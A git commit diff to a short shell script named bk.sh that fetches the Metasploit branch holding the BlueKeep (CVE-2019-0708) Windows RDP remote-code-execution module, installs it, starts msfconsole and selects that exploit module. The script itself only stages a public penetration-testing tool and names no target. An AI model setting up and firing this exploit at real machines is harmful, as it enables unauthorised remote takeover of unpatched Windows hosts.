8c0a82e70bc22b75359d603778b9e7895cf693f0
nu11secur1ty <venvaropt@gmail.com>
2019-09-15 18:45:59 +0300

    Update bk.sh

--- BlueKeep/bk.sh
+++ BlueKeep/bk.sh
@@ -1,8 +1,11 @@
 #!/usr/bin/bash
 cd /opt
-git clone https://github.com/rapid7/metasploit-framework.git
-cd metasploit-framework
-git fetch origin pull/12283/head:bluekeep
-git checkout bluekeep
-gem install bundler && bundle
+  git clone https://github.com/rapid7/metasploit-framework.git
+  cd metasploit-framework
+    git fetch origin pull/12283/head:bluekeep
+    git checkout bluekeep
+      gem install bundler && bundle
+        ./msfconsole -q
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+exit 0;
 
